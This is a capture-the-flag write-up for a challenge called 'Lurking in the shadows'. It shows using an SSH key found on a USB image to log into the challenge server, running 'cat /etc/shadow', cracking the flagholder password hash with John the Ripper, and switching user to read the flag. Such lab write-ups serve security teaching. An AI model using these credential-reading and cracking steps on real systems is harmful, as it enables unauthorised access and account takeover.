# Writeup -- Lurking in the shadows

## Download the zip containing the USB drive contents

Unzip it

```bash
unzip strange_usb.zip -d strange_usb
```

Find the ssh key in

```bash
strange_usb/.ssh/id_ed25519
```

Fix the permissions so that you can use it to ssh to the server

```bash
chmod 600 strange_usb/.ssh/id_ed25519
```

## SSH into the server as the ctf user

SSH into the server using the username `ctf` and the key `id_ed25519` found on the USB drive.

```bash
ssh -i strange_usb/.ssh/id_ed25519 ctf@0.cloud.chals.io -p 24100
```

## Get the hash

Get all password hashes by looking at `/etc/shadow`.

```bash
cat /etc/shadow
```

Copy and put the password hash for the user `flagholder` into a file.

## Crack the hash

Crack the password hash using John the ripper.

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt file_containing_password_hash
```

It should give you the password `autumn1` for the `flagholder` user.

## Log in to the flagholder user

Back on the server you can now switch user to the `flagholder` user.

```bash
su flagholder
```

Enter the password `autumn1`.

Find the flag! :)

```bash
cat /home/flagholder/flag.txt
```

# Command to generate a yescrypt linux password hash

```bash
mkpasswd -m yescrypt -s
```
